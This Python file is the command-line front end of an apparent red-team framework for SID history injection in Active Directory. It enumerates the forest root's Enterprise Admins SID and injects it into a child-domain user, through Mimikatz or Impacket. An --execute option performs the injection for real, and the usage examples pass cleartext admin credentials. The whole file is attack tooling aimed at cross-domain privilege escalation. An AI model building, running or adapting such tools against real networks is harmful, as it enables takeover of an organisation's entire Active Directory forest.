"""
SID History Injection CLI
Command-line interface for the SID history injection framework
"""

import argparse
import sys

from .framework import SIDHistoryFramework
from .injectors import get_available_injectors


def main():
    """Main CLI entry point"""
    parser = argparse.ArgumentParser(
        description="SID History Injection Framework - Escalate across domain boundaries",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate attack plan
  python -m rt_sid_history --domain child.corp.local --forest-root corp.local \\
    --username admin --password P@ssw0rd --action plan

  # Enumerate Enterprise Admins SID
  python -m rt_sid_history --domain corp.local --forest-root corp.local \\
    --username admin --password P@ssw0rd --action enum

  # Inject using Mimikatz (generates commands)
  python -m rt_sid_history --domain child.corp.local --forest-root corp.local \\
    --username admin --password P@ssw0rd --action inject --target-user administrator

  # Verify SID history
  python -m rt_sid_history --domain child.corp.local --forest-root corp.local \\
    --username admin --password P@ssw0rd --action verify --target-user administrator
        """
    )

    # Required arguments
    parser.add_argument(
        '--domain', '-d',
        type=str,
        required=True,
        help='Current domain (child domain for escalation)'
    )

    parser.add_argument(
        '--forest-root', '-f',
        type=str,
        required=True,
        help='Forest root domain'
    )

    # Authentication
    parser.add_argument(
        '--username', '-u',
        type=str,
        required=True,
        help='Domain Admin username'
    )

    parser.add_argument(
        '--password', '-p',
        type=str,
        required=True,
        help='Domain Admin password'
    )

    parser.add_argument(
        '--dc',
        type=str,
        help='Domain controller IP/hostname'
    )

    # Action
    parser.add_argument(
        '--action', '-a',
        type=str,
        choices=['enum', 'inject', 'verify', 'plan'],
        default='plan',
        help='Action to perform (default: plan)'
    )

    # Target
    parser.add_argument(
        '--target-user', '-t',
        type=str,
        help='User to inject SID into / verify'
    )

    # Injection method
    parser.add_argument(
        '--method', '-m',
        type=str,
        choices=['mimikatz', 'impacket', 'auto'],
        default='auto',
        help='Injection method (default: auto)'
    )

    # Output
    parser.add_argument(
        '--output', '-o',
        type=str,
        default='sid_history',
        help='Output directory (default: sid_history)'
    )

    parser.add_argument(
        '--quiet', '-q',
        action='store_true',
        help='Suppress status messages'
    )

    parser.add_argument(
        '--execute',
        action='store_true',
        help='Actually execute injection (vs generate commands only)'
    )

    # Parse
    args = parser.parse_args()

    # Initialize framework
    framework = SIDHistoryFramework(
        output_dir=args.output,
        verbose=not args.quiet
    )

    # Check available methods
    available = framework.list_available_injectors()

    # Execute action
    if args.action == 'enum':
        # Get Enterprise Admins SID
        ea_sid = framework.get_enterprise_admins_sid(
            args.forest_root,
            args.username,
            args.password,
            args.dc
        )

        if ea_sid:
            print(f"\n[+] Enterprise Admins SID: {ea_sid}")
            print(f"[*] Use this SID for injection into a child domain user")

    elif args.action == 'inject':
        if not args.target_user:
            print("[-] --target-user required for injection")
            sys.exit(1)

        # Get EA SID first
        ea_sid = framework.get_enterprise_admins_sid(
            args.forest_root,
            args.username,
            args.password,
            args.dc
        )

        if not ea_sid:
            print("[-] Could not get Enterprise Admins SID")
            sys.exit(1)

        # Determine method
        method = args.method
        if method == 'auto':
            if 'impacket' in available:
                method = 'impacket'
            elif 'mimikatz' in available:
                method = 'mimikatz'
            else:
                print("[-] No injection methods available")
                sys.exit(1)

        # Inject
        dc_ip = args.dc if args.dc else args.domain

        if method == 'impacket':
            operation = framework.inject_sid_history_impacket(
                args.target_user,
                args.domain,
                ea_sid,
                dc_ip,
                args.username,
                args.password,
                execute=args.execute
            )
        else:
            operation = framework.inject_sid_history_mimikatz(
                args.target_user,
                args.domain,
                ea_sid,
                dc_ip
            )

    elif args.action == 'verify':
        if not args.target_user:
            print("[-] --target-user required for verification")
            sys.exit(1)

        target = framework.verify_sid_history(
            args.target_user,
            args.domain,
            args.username,
            args.password,
            args.dc
        )

        if target:
            print(f"\n[*] User: {target.username}@{target.domain}")
            print(f"[*] Current SID: {target.current_sid}")
            print(f"[*] SID History: {target.sid_history or 'None'}")

            if target.has_privileged_sid():
                print(f"\n[+] User has PRIVILEGED SID in history!", "success")

    elif args.action == 'plan':
        # Register domains
        framework.register_domain(
            args.domain,
            args.username,
            args.password,
            args.dc,
            is_forest_root=False
        )

        framework.register_domain(
            args.forest_root,
            args.username,
            args.password,
            args.dc,
            is_forest_root=True
        )

        # Generate plan
        framework.generate_attack_plan(
            args.domain,
            args.forest_root,
            args.username
        )

    # Generate report
    framework.generate_report()

    print(f"\n[+] Results saved to: {args.output}/")


if __name__ == "__main__":
    main()